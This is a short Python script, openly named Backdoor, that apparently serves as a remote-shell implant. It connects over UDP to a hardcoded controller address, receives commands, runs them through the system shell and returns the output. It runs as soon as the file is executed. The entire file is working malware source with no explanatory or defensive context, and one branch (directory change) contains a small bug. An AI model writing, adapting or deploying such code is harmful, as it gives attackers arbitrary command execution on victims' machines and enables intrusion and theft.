import os
import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip="192.168.10.8", port=4443):
        self.target = (ip, port)
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def execute_sys_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_recv(self):
        json_data, _ = self.connection.recvfrom(1024*1024)
        return json.loads(json_data)

    def reliable_send(self, data):
        json_data = json.dumps(data.decode())
        self.connection.sendto(json_data.encode(), self.target)

    def change_dir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def run(self):
        while True:
            try:
                command = self.reliable_recv()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd":
                    command_result = self.change_dir(command[1])
                    self.reliable_send(command_result)
                else:
                    command_result = self.execute_sys_command(command)
                    self.reliable_send(command_result)
            except subprocess.CalledProcessError:
                continue

my_backdoor = Backdoor()
my_backdoor.run()

